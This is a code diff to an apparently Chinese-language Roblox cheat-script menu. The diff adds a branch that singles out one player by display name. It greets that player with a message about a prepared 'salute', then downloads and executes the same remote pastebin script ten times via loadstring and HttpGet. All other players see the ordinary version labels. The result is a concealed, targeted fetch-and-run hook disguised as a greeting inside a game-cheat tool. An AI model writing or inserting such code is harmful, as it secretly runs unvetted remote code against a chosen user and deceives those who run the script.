@@ -105,9 +105,25 @@ local Tab = Tab1:section("脚本中心",true)
 --
 local music = music1:section("音乐",true)
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+if game.Players.LocalPlayer.DisplayName == "pjscript" then
+    bin:Label(REN["Name"].."十分欢迎你")
+    bin:Label(REN["Name"].."为你准备了礼炮")
+    wait(3)
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/FqWgJJEp"))();
+else
     bin:Label(REN["Name"].."交流群：719409149")
     bin:Label(REN["Name"].."疯狂优化中...")
     bin:Label(REN["Name"].."最新版本:"..REN["版本"].."")
+end
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 function tp(p)
